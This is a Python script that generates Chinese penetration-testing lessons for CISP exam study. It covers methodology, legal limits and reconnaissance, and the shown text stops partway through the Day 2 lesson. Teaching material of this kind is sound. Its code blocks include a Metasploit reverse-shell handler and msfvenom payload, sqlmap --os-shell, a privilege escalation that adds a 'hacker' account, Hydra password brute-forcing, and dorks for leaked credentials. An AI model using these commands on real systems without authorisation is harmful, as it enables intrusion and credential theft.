import os

DIR = r'E:\internal_safe\cisp1\cisp\public\contents\cyber-learning\penetration'
os.makedirs(DIR, exist_ok=True)

def gen(filename, content):
    path = os.path.join(DIR, filename)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    lines = content.count('\n') + 1
    print(f'  {filename}: {lines} lines')

# ===================================================================
# Day 1：渗透测试概述
# ===================================================================
gen('day-1.md', """# Day 1：渗透测试概述

> **📘 文档定位**：CISP 考试核心基础 | 难度：入门 | 预计阅读：35 分钟
>
> 渗透测试是网络安全领域最核心的实战技能之一。它不是"随便黑一下"，而是一套严谨的方法论，涵盖信息收集、漏洞扫描、漏洞利用、权限提升、横向移动、权限维持、痕迹清理、报告撰写等完整流程。理解渗透测试的定义、分类、法律边界和标准化框架，是每个安全从业者的基本功。

---

## 导航目录

- [一、渗透测试的定义与目标](#一渗透测试的定义与目标)
- [二、渗透测试的分类](#二渗透测试的分类)
- [三、渗透测试标准化框架](#三渗透测试标准化框架)
- [四、渗透测试流程详解](#四渗透测试流程详解)
- [五、法律法规与授权边界](#五法律法规与授权边界)
- [六、渗透测试常用工具全景](#六渗透测试常用工具全景)
- [七、渗透测试环境搭建](#七渗透测试环境搭建)
- [八、红蓝对抗与渗透测试的区别](#八红蓝对抗与渗透测试的区别)
- [九、渗透测试职业发展路径](#九渗透测试职业发展路径)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、渗透测试的定义与目标

### 1.1 什么是渗透测试

渗透测试（Penetration Testing，简称 Pentest）是通过模拟黑客攻击的方式，对目标系统的安全性进行评估的过程。它的核心目的是**在黑客发现漏洞之前，先发现并修复它们**。

渗透测试与漏洞扫描的本质区别在于：

| 对比维度 | 渗透测试 | 漏洞扫描 |
|:---|:---|:---|
| 执行方式 | 人工主导 + 工具辅助 | 自动化工具为主 |
| 深度 | 深入验证，利用漏洞证明危害 | 表面识别，报告潜在漏洞 |
| 误报率 | 低（人工确认） | 较高（需人工研判） |
| 目标 | 评估整体安全态势 | 识别已知漏洞 |
| 典型工具 | Burp Suite, Metasploit, Cobalt Strike | Nessus, OpenVAS, AWVS |
| 报告内容 | 攻击路径 + 修复建议 + 风险评级 | 漏洞列表 + CVSS 评分 |

> **🔑 高分考点**：渗透测试的关键特征——**授权、模拟攻击、深度验证、风险可控**。未经授权的渗透测试即为非法入侵。

### 1.2 渗透测试的核心目标

渗透测试的六大核心目标：

1. **识别安全漏洞**：发现系统中可被利用的安全缺陷
2. **验证防御能力**：测试现有安全控制措施的有效性
3. **量化业务风险**：评估漏洞被利用后对业务的影响
4. **满足合规要求**：PCI-DSS、ISO 27001、等保等合规需求
5. **提升安全意识**：通过实战演示提高组织安全意识
6. **指导安全投入**：为安全建设提供优先级参考

### 1.3 渗透测试的"黄金三角"

```
                授权 (Authorization)
                   /\
                  /  \
                 /    \
                /      \
               /________\
    方法论 (Methodology)    可重现 (Reproducibility)
```

> **💡 知识巧记**：授权是渗透测试的**法律底线**，方法论是**质量保障**，可重现是**专业体现**。

---

## 二、渗透测试的分类

### 2.1 按信息掌握程度分类

| 类型 | 信息掌握程度 | 典型场景 | 优势 | 劣势 |
|:---|:---|:---|:---|:---|
| **黑盒测试** | 无任何内部信息，仅目标名称/URL | 模拟外部黑客攻击 | 最贴近真实攻击 | 耗时长，可能遗漏内部漏洞 |
| **白盒测试** | 提供完整信息：架构图、源码、配置、账号 | 全面安全审计 | 覆盖率高、效率高 | 不够贴近真实攻击 |
| **灰盒测试** | 提供部分信息：普通用户账号、API文档 | 模拟内部员工/合作伙伴 | 效率与真实性平衡 | 信息范围界定困难 |

> **🔑 高分考点**：黑盒测试 = 零知识测试（Zero-Knowledge Testing），白盒测试 = 完全知识测试（Full-Knowledge Testing），灰盒测试 = 部分知识测试（Partial-Knowledge Testing）。

### 2.2 按测试范围分类

```bash
# 渗透测试范围分类
+-- 外部渗透测试
|   +-- 互联网暴露面资产
|   +-- Web应用、API接口
|   +-- 邮件服务器、VPN网关
|   +-- DNS、云存储
|
+-- 内部渗透测试
|   +-- 内网网络架构
|   +-- 域控制器、内网服务
|   +-- 无线网络
|   +-- 终端安全
|
+-- 应用渗透测试
|   +-- Web应用（OWASP Top 10）
|   +-- 移动APP（Android/iOS）
|   +-- 桌面客户端
|   +-- API安全测试
|
+-- 社会工程学测试
    +-- 钓鱼邮件测试
    +-- 电话社工
    +-- 物理入侵测试
    +-- USB掉落测试
```

### 2.3 按目标系统分类

| 分类 | 测试对象 | 重点关注 |
|:---|:---|:---|
| 网络渗透测试 | 网络设备、防火墙、路由器、交换机 | ACL配置、VLAN隔离、端口安全 |
| Web渗透测试 | Web应用、API、CMS | SQL注入、XSS、CSRF、认证绕过 |
| 移动渗透测试 | Android/iOS App | 数据存储、网络通信、逆向分析 |
| 云渗透测试 | AWS/Azure/GCP环境 | IAM权限、存储桶配置、Serverless |
| 无线渗透测试 | WiFi、蓝牙、RFID | WPA3攻击、蓝牙嗅探、RFID克隆 |
| IoT渗透测试 | 智能设备、嵌入式系统 | 固件分析、硬件接口、通信协议 |

---

## 三、渗透测试标准化框架

### 3.1 PTES（渗透测试执行标准）

PTES（Penetration Testing Execution Standard）是目前最广泛使用的渗透测试标准化框架，分为七个阶段：

| 阶段 | 名称 | 核心活动 | 典型工具/技术 |
|:---|:---|:---|:---|
| 1 | 前期交互 | 确定范围、签署授权书、沟通规则 | 授权协议模板、ROE文档 |
| 2 | 信息收集 | 被动/主动收集目标信息 | whois, dig, Shodan, theHarvester |
| 3 | 威胁建模 | 分析攻击面、确定攻击路径 | STRIDE模型、攻击树 |
| 4 | 漏洞分析 | 识别和验证漏洞 | Nessus, Nmap, Nikto, 手工验证 |
| 5 | 漏洞利用 | 利用漏洞获取访问权限 | Metasploit, 自定义EXP, sqlmap |
| 6 | 后渗透 | 权限提升、横向移动、数据获取 | Mimikatz, BloodHound, PsExec |
| 7 | 报告撰写 | 编写渗透测试报告 | 报告模板、风险矩阵、修复建议 |

### 3.2 OWASP测试指南

OWASP（Open Web Application Security Project）提供的测试指南是Web渗透测试的"圣经"：

```
OWASP 测试框架：
├── 信息收集（OTG-INFO）
│   ├── 搜索引擎信息收集
│   ├── Web服务器指纹识别
│   └── 应用入口点识别
├── 配置管理测试（OTG-CONFIG）
│   ├── SSL/TLS配置测试
│   ├── 数据库监听器测试
│   └── 文件扩展名处理测试
├── 身份认证测试（OTG-AUTHN）
│   ├── 凭证传输加密测试
│   ├── 默认凭证测试
│   └── 弱密码策略测试
├── 授权测试（OTG-AUTHZ）
│   ├── 路径遍历测试
│   ├── 权限提升测试
│   └── IDOR测试
├── 会话管理测试（OTG-SESS）
│   ├── Cookie属性测试
│   └── CSRF测试
├── 输入验证测试（OTG-INPVAL）
│   ├── XSS测试
│   ├── SQL注入测试
│   └── 代码注入测试
├── 业务逻辑测试（OTG-BUSLOGIC）
└── 客户端测试（OTG-CLIENT）
```

> **🔑 高分考点**：PTES 是渗透测试的通用标准，OWASP 测试指南是 Web 应用的专项标准。CISP 考试中常问 PTES 的七个阶段顺序。

### 3.3 NIST SP 800-115

NIST SP 800-115 是美国国家标准与技术研究院发布的技术安全测试指南，将安全测试分为四类：

| 测试类型 | 描述 | 执行方式 |
|:---|:---|:---|
| 审查技术 | 文档审查、日志审查、配置审查 | 被动、非侵入 |
| 目标识别与分析 | 网络发现、端口/服务识别、漏洞扫描 | 主动 |
| 目标漏洞验证 | 密码破解、渗透测试、社工 | 主动、侵入性 |
| 测试规划 | 确定测试目标和范围 | 前期 |

---

## 四、渗透测试流程详解

### 4.1 阶段一：前期交互

这是渗透测试的**起点**，也是最容易被忽视的阶段。核心工作包括：

```bash
# 前期交互检查清单
1. 签署授权书（Authorization Letter）
2. 确定测试范围（Scope）
   - IP段：192.168.1.0/24
   - 域名：*.example.com
   - 排除项：生产数据库、核心业务时段
3. 确定测试规则（Rules of Engagement）
   - 测试时间窗口：每日 22:00-06:00
   - 禁止使用的攻击技术：DDoS、社会工程学（如不包含）
   - 紧急联系人：安全经理电话
4. 确定沟通机制
   - 每日进度报告
   - 高危漏洞即时通报
   - 测试结束确认
```

### 4.2 阶段二：信息收集

信息收集是渗透测试中**最重要**的阶段，决定了后续测试的深度和广度。分为被动和主动两种：

```bash
# 被动信息收集（不直接与目标交互）
whois example.com                          # WHOIS查询
dig example.com ANY                        # DNS查询
theHarvester -d example.com -b google      # 邮箱收集
shodan search org:"Example Corp"           # Shodan搜索
python3 recon-ng                          # 综合信息收集框架

# 主动信息收集（直接与目标交互）
nmap -sn 192.168.1.0/24                   # 主机发现
nmap -sV -sC -p- 192.168.1.100            # 服务版本扫描
nmap --script=vuln 192.168.1.100          # 漏洞脚本扫描
```

### 4.3 阶段三：漏洞分析

识别漏洞后需要进行**人工验证**，不能仅依赖扫描器结果：

| 漏洞类型 | 自动化工具 | 手工验证方法 |
|:---|:---|:---|
| SQL注入 | sqlmap | 单引号测试、时间盲注手工验证 |
| XSS | XSStrike | 浏览器弹窗确认 |
| 文件上传 | Burp Suite | 上传webshell并访问确认 |
| 命令注入 | Commix | ping/traceroute回显确认 |
| 弱口令 | Hydra, Medusa | 手动登录确认 |
| 未授权访问 | Nmap | curl/浏览器直接访问确认 |

### 4.4 阶段四：漏洞利用

```bash
# 漏洞利用典型流程
# Step 1: 获取初始访问
sqlmap -u "http://target.com/page.php?id=1" --os-shell
# 或
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Step 2: 建立持久化连接
# 升级到Meterpreter会话
sessions -u 1
# 或使用MSFVenom生成payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Step 3: 权限提升
# Windows本地提权
systeminfo | findstr /B /C:"OS Name" /C:"Hotfix"
# 利用MS16-032提权
Invoke-MS16-032 -Command "cmd /c net user hacker P@ssw0rd /add"
```

> **🔑 高分考点**：漏洞利用必须在获得授权后才能进行。漏洞验证（POC）和完整利用（EXP）有本质区别——POC仅证明漏洞存在，EXP实现完整攻击链。

### 4.5 阶段五：后渗透

后渗透是整个渗透测试中**技术含量最高**的阶段，也是区别于初级和高级渗透测试师的关键：

```
后渗透攻击链：
初始立足点 → 权限提升 → 信息收集 → 横向移动 → 权限维持 → 数据窃取 → 痕迹清理

关键工具：
├── 权限提升
│   ├── Windows: PowerUp.ps1, JuicyPotato, PrintSpoofer
│   └── Linux: LinPEAS, pwnkit, DirtyPipe (CVE-2022-0847)
├── 内网信息收集
│   ├── BloodHound (AD关系分析)
│   ├── PingCastle (AD安全评估)
│   └── Seatbelt (Windows主机枚举)
├── 横向移动
│   ├── PsExec, WMI, WinRM
│   ├── Pass-the-Hash (Mimikatz)
│   └── Pass-the-Ticket (Rubeus)
└── 权限维持
    ├── Windows: 计划任务、服务、注册表
    └── Linux: cron, SSH密钥, systemd
```

### 4.6 阶段六：报告撰写

报告是渗透测试的**最终交付物**。一份专业的渗透测试报告应包含：

```markdown
渗透测试报告结构：
1. 执行摘要（给管理层看）
   - 测试概述
   - 总体风险评级
   - 关键发现（Top 3）
   - 安全建设建议

2. 技术报告（给技术人员看）
   - 测试方法论
   - 漏洞详情（CVSS评分、复现步骤、修复建议）
   - 攻击路径图
   - 日志/截图/证据

3. 附录
   - 工具清单
   - 测试时间线
   - 术语表
```

---

## 五、法律法规与授权边界

### 5.1 相关法律法规

| 法律/法规 | 适用范围 | 关键条款 |
|:---|:---|:---|
| 《网络安全法》 | 中国境内网络运营 | 第21条：等级保护；第27条：禁止非法入侵 |
| 《数据安全法》 | 数据处理活动 | 数据分类分级、风险评估 |
| 《个人信息保护法》 | 个人信息处理 | 告知-同意原则 |
| 《刑法》第285条 | 计算机犯罪 | 非法侵入计算机信息系统罪 |
| 《刑法》第286条 | 计算机犯罪 | 破坏计算机信息系统罪 |
| CFAA（美国） | 美国计算机系统 | 未经授权访问受保护计算机 |

### 5.2 授权书必备要素

> **🔑 高分考点**：渗透测试授权书必须包含：**测试范围、测试时间、授权人签字、测试方法限制、数据保护条款、免责声明**。

```text
渗透测试授权书关键要素：
□ 授权方与被授权方信息
□ 测试目标IP段/域名列表
□ 禁止测试的系统/服务
□ 测试时间窗口
□ 允许使用的技术手段
□ 数据保护与保密协议
□ 第三方服务条款
□ 双方签字盖章
□ 法律适用与争议解决
```

### 5.3 渗透测试的"红灯区"

以下行为**无论是否有授权都不应执行**：

1. **DDoS/资源耗尽攻击**：可能导致业务中断
2. **生产数据篡改/删除**：不可逆的损害
3. **真实用户数据窃取**：违反隐私法规
4. **绕过授权范围的测试**：法律风险
5. **未告知的物理入侵**：可能触犯刑法

---

## 六、渗透测试常用工具全景

### 6.1 工具分类矩阵

| 类别 | 工具 | 功能 | 平台 | 许可证 |
|:---|:---|:---|:---|:---|
| 信息收集 | Nmap | 端口扫描、服务识别 | 跨平台 | GPL |
| 信息收集 | theHarvester | 邮箱/域名收集 | Linux | GPL |
| 信息收集 | Shodan | 互联网设备搜索 | Web | 商业 |
| Web代理 | Burp Suite | HTTP拦截/篡改 | 跨平台 | 商业/社区 |
| Web代理 | OWASP ZAP | HTTP代理扫描 | 跨平台 | Apache 2.0 |
| 漏洞扫描 | Nessus | 综合漏洞扫描 | 跨平台 | 商业 |
| 漏洞扫描 | OpenVAS | 开源漏洞扫描 | Linux | GPL |
| 漏洞利用 | Metasploit | 漏洞利用框架 | 跨平台 | BSD |
| 漏洞利用 | sqlmap | SQL注入自动化 | 跨平台 | GPL |
| 密码破解 | John the Ripper | 密码哈希破解 | 跨平台 | GPL |
| 密码破解 | Hashcat | GPU加速密码破解 | 跨平台 | MIT |
| 无线安全 | Aircrack-ng | WiFi安全测试 | Linux | GPL |
| 后渗透 | Mimikatz | 凭证提取 | Windows | 开源 |
| 后渗透 | BloodHound | AD攻击路径分析 | 跨平台 | BSD |
| 后渗透 | Cobalt Strike | 对手模拟 | 跨平台 | 商业 |

### 6.2 Kali Linux

Kali Linux 是渗透测试的标准操作系统，预装超过600个安全工具：

```bash
# Kali Linux 核心工具速查
# 信息收集
nmap -sV -sC -O -p- 192.168.1.0/24
masscan -p1-65535 --rate=10000 192.168.1.0/24
amass enum -d example.com

# Web应用
sqlmap -u "http://target.com/page.php?id=1" --dbs
nikto -h https://target.com
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 密码攻击
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# 漏洞利用
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST eth0; exploit"
searchsploit apache 2.4
```

---

## 七、渗透测试环境搭建

### 7.1 虚拟化环境

```bash
# 推荐靶机环境搭建
# 1. 安装 VirtualBox/VMware
# 2. 下载以下靶机：
#    - Metasploitable2: 综合漏洞靶机
#    - Metasploitable3: Windows/Linux 漏洞环境
#    - DVWA: Web漏洞练习平台
#    - VulnHub 系列: 各种难度靶机
#    - HackTheBox 会员: 在线靶场

# 3. 网络配置
# NAT网络: 192.168.56.0/24
# 攻击机: Kali Linux (192.168.56.101)
# 靶机1: Metasploitable2 (192.168.56.102)
# 靶机2: Windows 7 (192.168.56.103)
```

### 7.2 必备工具链

```bash
# 攻击机环境初始化脚本（Kali Linux）
sudo apt update && sudo apt upgrade -y

# 信息收集工具
sudo apt install -y nmap masscan dnsrecon theharvester amass

# Web工具
sudo apt install -y burpsuite zaproxy sqlmap dirb gobuster ffuf

# 漏洞利用
sudo apt install -y metasploit-framework exploitdb searchsploit

# 密码工具
sudo apt install -y hydra john hashcat crunch

# 后渗透
sudo apt install -y powershell-empire starkiller responder

# Python渗透测试库
pip3 install impacket pwntools requests beautifulsoup4 scapy
```

---

## 八、红蓝对抗与渗透测试的区别

### 8.1 对比分析

| 维度 | 渗透测试 | 红蓝对抗 |
|:---|:---|:---|
| 目标 | 发现漏洞 | 检验防御体系 |
| 范围 | 特定系统/应用 | 整个组织 |
| 持续时间 | 1-4周 | 数周到数月 |
| 攻击手法 | 传统攻击路径 | APT级别多阶段攻击 |
| 防御方 | 通常不涉及 | 蓝队实时防御 |
| 成果 | 漏洞报告 | 攻防能力评估 |
| 隐蔽性 | 不太关注 | 高度隐蔽 |
| 典型工具 | Metasploit, Burp | Cobalt Strike, 自定义工具 |

### 8.2 红队攻击框架

```
红队攻击链（基于MITRE ATT&CK）：
初始访问 → 执行 → 持久化 → 权限提升 → 防御规避
    ↓
凭证访问 → 发现 → 横向移动 → 收集 → 命令与控制 → 数据渗出
```

> **🔑 高分考点**：渗透测试是**发现漏洞**，红蓝对抗是**检验防御**。红队更注重**隐蔽性和持续性**。

---

## 九、渗透测试职业发展路径

### 9.1 认证路径

| 认证 | 颁发机构 | 难度 | 侧重点 | 费用 |
|:---|:---|:---|:---|:---|
| CISP-PTE | 中国信息安全测评中心 | 中级 | 渗透测试工程师 | ¥ |
| OSCP | Offensive Security | 中高级 | 实战渗透 | $$$ |
| OSCE/OSEP | Offensive Security | 高级 | 漏洞利用开发/规避 | $$$$ |
| GPEN | SANS/GIAC | 高级 | 网络渗透测试 | $$$$$ |
| eCPPT | eLearnSecurity | 中级 | 专业渗透测试 | $$ |
| PNPT | TCM Security | 中高级 | 实战网络渗透 | $$ |

### 9.2 技能成长路线图

```
初级渗透测试工程师
├── 熟练使用 Kali Linux
├── 掌握 Nmap、Burp Suite、sqlmap
├── 理解 OWASP Top 10
└── 能独立完成 Web 漏洞验证

中级渗透测试工程师
├── 精通 Metasploit 框架
├── 掌握内网渗透技术
├── 能编写简单 PoC/Exp
├── 了解 Active Directory 攻击
└── 能独立完成完整渗透测试项目

高级渗透测试工程师
├── 精通漏洞利用开发（Buffer Overflow、ROP）
├── 掌握免杀与反检测技术
├── 精通 AD 攻击全链
├── 能进行红蓝对抗指挥
└── 具备安全架构评估能力
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | 渗透测试定义 | ★★★★★ | ★ | 授权模拟攻击，评估安全性 |
| 2 | 黑盒/白盒/灰盒 | ★★★★★ | ★★ | 零知识/完全知识/部分知识测试 |
| 3 | PTES 七阶段 | ★★★★ | ★★ | 前期交互→信息收集→威胁建模→漏洞分析→漏洞利用→后渗透→报告 |
| 4 | 渗透测试 vs 漏洞扫描 | ★★★★ | ★★ | 人工深入验证 vs 自动表面识别 |
| 5 | 授权书必备要素 | ★★★★ | ★★ | 范围、时间、授权人、方法限制、数据保护 |
| 6 | OWASP 测试指南 | ★★★ | ★★★ | Web应用渗透测试标准框架 |
| 7 | 渗透测试 vs 红蓝对抗 | ★★★ | ★★★ | 发现漏洞 vs 检验防御体系 |
| 8 | NIST SP 800-115 | ★★★ | ★★★ | 四类测试：审查、识别分析、漏洞验证、规划 |
| 9 | 后渗透阶段内容 | ★★★ | ★★★ | 提权、横向移动、权限维持、痕迹清理 |
| 10 | 渗透测试报告结构 | ★★★ | ★★ | 执行摘要+技术报告+附录 |

### 💡 知识巧记口诀

> **"PTES七步走"** — 前交、信息、威胁、漏洞、利用、后渗、报告。记住：**"前信威漏利后报"**——前期交互、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透、报告撰写。

> **"三色测试法"** — 黑盒（Zero Knowledge）模拟外部黑客，白盒（Full Knowledge）进行全面审计，灰盒（Partial Knowledge）平衡效率与真实性。记住：**"黑客黑，审计白，员工灰"**。

> **"授权六要素"** — 范围、时间、授权人、方法限制、数据保护、免责声明。记住：**"范时授法数免"**——范围、时间、授权、方法、数据、免责。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "渗透测试就是找漏洞" | ❌ 不全面！还包括验证防御能力、量化风险、满足合规 |
| "黑盒测试比白盒测试更好" | ❌ 各有优劣！黑盒贴近真实但覆盖率低，白盒覆盖率高但不够真实 |
| "有了漏洞扫描就不需要渗透测试" | ❌ 错误！扫描器误报率高，无法验证业务逻辑漏洞 |
| "渗透测试可以顺便测试关联系统" | ❌ 严重违规！只能在授权范围内测试 |
| "社工测试不需要单独授权" | ❌ 错误！社会工程学测试涉及人员隐私，需单独授权 |
| "PTES 的第7阶段是漏洞利用" | ❌ 错误！第5阶段是漏洞利用，第7阶段是报告撰写 |

---

## 学习建议

1. 🛠️ **搭建实验环境**：安装 VirtualBox，部署 Kali Linux + Metasploitable2/3，这是学习渗透测试的必备环境
2. 📚 **系统学习 PTES**：以 PTES 七阶段为主线，逐步深入学习每个阶段的工具和技术
3. 🔬 **动手实践优先**：每学一个工具就立即在靶机上实践，不要只看文档不操作
4. 📝 **养成记录习惯**：使用 CherryTree 或 Obsidian 记录攻击过程和发现，这直接关系到报告质量
5. 🎯 **考取权威认证**：计划考取 OSCP 或 CISP-PTE，系统化验证学习成果
6. ⚖️ **牢记法律底线**：永远在授权范围内进行测试，这是职业生命线
7. 🌐 **加入安全社区**：关注 FreeBuf、先知社区、HackTheBox 等平台，保持技术前沿

---

> **渗透测试是一门"戴着镣铐跳舞"的艺术——在授权范围内，用黑客的思维，守护系统的安全。记住：能力越大，责任越大。**
""")

# ===================================================================
# Day 2：被动信息收集
# ===================================================================
gen('day-2.md', """# Day 2：被动信息收集

> **📘 文档定位**：CISP 考试核心基础 | 难度：入门 | 预计阅读：40 分钟
>
> 被动信息收集是渗透测试的第一步，也是决定后续攻击成功率的关键环节。被动收集意味着不与目标系统直接交互，目标不会产生任何日志记录。一个优秀的渗透测试工程师，能在不动用任何扫描器的情况下，通过公开信息拼凑出目标的完整攻击面。

---

## 导航目录

- [一、被动信息收集概述](#一被动信息收集概述)
- [二、搜索引擎高级利用](#二搜索引擎高级利用)
- [三、WHOIS与域名信息收集](#三whois与域名信息收集)
- [四、Shodan网络空间搜索引擎](#四shodan网络空间搜索引擎)
- [五、子域名枚举技术](#五子域名枚举技术)
- [六、邮件与人员信息收集](#六邮件与人员信息收集)
- [七、代码仓库信息泄露](#七代码仓库信息泄露)
- [八、SSL证书信息挖掘](#八ssl证书信息挖掘)
- [九、综合信息收集工具链](#九综合信息收集工具链)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、被动信息收集概述

### 1.1 什么是被动信息收集

被动信息收集（Passive Information Gathering）是指在不与目标系统建立直接连接的情况下，通过公开渠道获取目标信息的活动。关键特征：**目标零感知、零日志记录**。

与主动信息收集的对比：

| 维度 | 被动收集 | 主动收集 |
|:---|:---|:---|
| 交互方式 | 不直接访问目标 | 直接与目标系统交互 |
| 目标感知 | 零感知 | 产生日志/告警 |
| 信息类型 | 公开信息、元数据 | 端口、服务版本、配置 |
| 速度 | 较快 | 取决于网络条件 |
| 隐蔽性 | 完全隐蔽 | 可能触发IDS/IPS |
| 典型来源 | 搜索引擎、WHOIS、DNS、社交媒体 | Nmap扫描、服务探测 |
| 风险等级 | 无法律风险 | 需授权 |

### 1.2 被动信息收集的价值

> **🔑 高分考点**：被动信息收集可以获取目标组织的**技术栈、人员结构、网络拓扑、合作伙伴、安全策略**等信息，为后续攻击提供精准的情报支持。

```
被动信息收集的攻击面映射：
┌─────────────────────────────────────────┐
│              公开信息源                    │
├─────────────────────────────────────────┤
│ Google Hacking → 敏感文件、后台地址        │
│ Shodan/Censys → 开放端口、服务指纹         │
│ WHOIS → 注册人、联系方式、DNS服务器         │
│ DNS Dumpster → DNS记录、子域名             │
│ LinkedIn → 员工信息、技术栈               │
│ GitHub → 源码泄露、API密钥、配置文件        │
│ Wayback Machine → 历史页面、隐藏功能        │
│ SSL证书 → 关联域名、内部域名               │
│ 招聘网站 → 技术栈、安全产品                │
└─────────────────────────────────────────┘
```

### 1.3 信息收集的法律边界

被动信息收集利用的都是**公开可获取**的信息，不涉及对目标系统的直接访问。但需要注意：

- **合规要求**：即使是被动收集，也应在授权范围内进行
- **隐私保护**：收集个人信息需遵守相关法规
- **数据使用**：收集的信息仅用于授权的安全测试目的

---

## 二、搜索引擎高级利用

### 2.1 Google Hacking 核心语法

Google Hacking（也称Google Dorking）是利用搜索引擎高级搜索语法发现敏感信息的技术。以下是核心语法：

| 语法 | 功能 | 示例 |
|:---|:---|:---|
| `site:` | 限定搜索域名 | `site:example.com` |
| `intitle:` | 搜索网页标题 | `intitle:"index of"` |
| `inurl:` | 搜索URL中的关键词 | `inurl:admin` |
| `intext:` | 搜索正文内容 | `intext:"password"` |
| `filetype:` | 限定文件类型 | `filetype:pdf confidential` |
| `cache:` | 查看Google缓存 | `cache:example.com` |
| `link:` | 查找链接到某页面的页面 | `link:example.com` |
| `related:` | 查找相关网站 | `related:example.com` |
| `-` | 排除关键词 | `site:example.com -www` |
| `*` | 通配符 | `"powered by * cms"` |

### 2.2 实战 Google Dork 示例

```bash
# 1. 查找敏感目录
site:example.com intitle:"index of"
site:example.com intitle:"index of" "parent directory"

# 2. 查找配置文件
site:example.com filetype:conf OR filetype:cnf OR filetype:config
site:example.com filetype:env "DB_PASSWORD"

# 3. 查找管理后台
site:example.com inurl:admin OR inurl:login OR inurl:dashboard
site:example.com intitle:"admin panel"

# 4. 查找数据库备份
site:example.com filetype:sql "INSERT INTO"
site:example.com filetype:bak OR filetype:backup

# 5. 查找源码泄露
site:example.com filetype:php OR filetype:asp OR filetype:jsp

# 6. 查找错误信息
site:example.com intext:"sql syntax error" OR intext:"mysql_fetch"
site:example.com intext:"stack trace" OR intext:"exception in"

# 7. 查找敏感文档
site:example.com filetype:pdf OR filetype:docx "confidential"
site:example.com filetype:xlsx "password"

# 8. 查找IoT设备
intitle:"webcam" inurl:view/index.shtml
intitle:"router" inurl:"status"
```

> **🔑 高分考点**：Google Hacking 数据库（GHDB）收录了大量公开的 dork 查询。`site:` 和 `filetype:` 是最常用的两个语法。

### 2.3 Exploit-DB Google Hacking Database

Exploit-DB 维护的 GHDB 将 dork 分为多个类别：

| 类别 | 描述 | 示例 dork |
|:---|:---|:---|
| Files containing passwords | 包含密码的文件 | `filetype:txt intext:password` |
| Sensitive directories | 敏感目录 | `intitle:"index of" "backup"` |
| Vulnerable servers | 漏洞服务器 | `inurl:"/phpmyadmin/"` |
| Error messages | 错误消息 | `intext:"Warning: mysql_connect()"` |
| Network/ Vulnerability data | 网络漏洞数据 | `inurl:"/cgi-bin/"` |

### 2.4 其他搜索引擎利用

```bash
# Shodan
# 搜索暴露的RDP服务
shodan search 'port:3389 country:"CN"'
# 搜索未授权MongoDB
shodan search 'product:"MongoDB" -auth'

# Censys
# 搜索SSL证书关联域名
censys search 'services.tls.certificates.leaf_data.subject.common_name:"example.com"'

# Fofa（国内常用）
# 搜索Weblogic服务器
fofa search 'app="Weblogic"'
# 搜索Spring Boot应用
fofa search 'app="Spring-Boot"'
```

---

## 三、WHOIS与域名信息收集

### 3.1 WHOIS 查询

WHOIS 是一个查询域名注册信息的协议，可以获取域名的注册人、注册时间、到期时间、DNS服务器等信息：

```bash
# Linux/Unix WHOIS 查询
whois example.com
whois -h whois.verisign-grs.com example.com  # 指定WHOIS服务器

# 批量WHOIS查询
for domain in $(cat domains.txt); do
    echo "=== $domain ===" >> whois_results.txt
    whois $domain >> whois_results.txt 2>&1
done

# 在线WHOIS工具
# https://whois.domaintools.com/
# https://who.is/
# https://www.whois.com/
```

### 3.2 WHOIS 信息解读

| WHOIS字段 | 含义 | 渗透测试价值 |
|:---|:---|:---|
| Domain Name | 域名 | 确认目标域名 |
| Registry Domain ID | 注册ID | 唯一标识 |
| Registrar | 注册商 | 了解域名服务商 |
| Creation Date | 创建日期 | 评估目标存在时间 |
| Expiration Date | 到期日期 | 过期域名可被抢注 |
| Name Server | DNS服务器 | 发现更多域名资产 |
| Registrant Name | 注册人姓名 | 社工信息 |
| Registrant Email | 注册人邮箱 | 钓鱼/社工目标 |
| Registrant Phone | 注册人电话 | 社工信息 |

> **💡 知识巧记**：WHOIS 信息泄露是渗透测试的"第一桶金"——注册人邮箱可能关联多个域名，DNS服务器可能托管更多目标资产。

### 3.3 历史WHOIS数据

```bash
# DomainTools 历史WHOIS（商业工具）
# 可以查看域名历史上的注册人变更

# WhoisXML API
curl "https://www.whoisxmlapi.com/whoisserver/WhoisService?apiKey=YOUR_KEY&domainName=example.com"

# 反向WHOIS查询（通过邮箱查域名）
# 发现同一注册人名下的所有域名
```

### 3.4 DNS信息收集

```bash
# DNS记录类型与查询
dig example.com A          # IPv4地址记录
dig example.com AAAA       # IPv6地址记录
dig example.com MX         # 邮件交换记录
dig example.com NS         # 域名服务器记录
dig example.com CNAME      # 别名记录
dig example.com TXT        # 文本记录（可能含SPF/DKIM）
dig example.com SOA        # 授权起始记录
dig example.com ANY        # 所有记录

# 区域传送漏洞检测
dig axfr @ns1.example.com example.com

# DNS反向查询
dig -x 192.168.1.1

# 使用特定DNS服务器查询
dig @8.8.8.8 example.com
```

---

## 四、Shodan网络空间搜索引擎

### 4.1 Shodan 简介

Shodan 被称为"黑客的Google"，它定期扫描整个互联网，索引所有联网设备的 banner 信息。通过 Shodan，你可以发现目标组织暴露在互联网上的所有资产。

### 4.2 Shodan 搜索语法

```bash
# Shodan CLI 安装
pip3 install shodan
shodan init YOUR_API_KEY

# 基础搜索
shodan search 'hostname:example.com'
shodan search 'org:"Example Corp"'
shodan search 'net:192.168.1.0/24'

# 服务搜索
shodan search 'port:22'                    # 搜索开放SSH的服务
shodan search 'port:3389'                  # 搜索RDP服务
shodan search 'product:nginx'              # 搜索Nginx服务器
shodan search 'product:"Apache httpd"'     # 搜索Apache服务器

# 版本搜索
shodan search 'product:"OpenSSH" version:"7.4"'  # 搜索特定版本

# 地理位置搜索
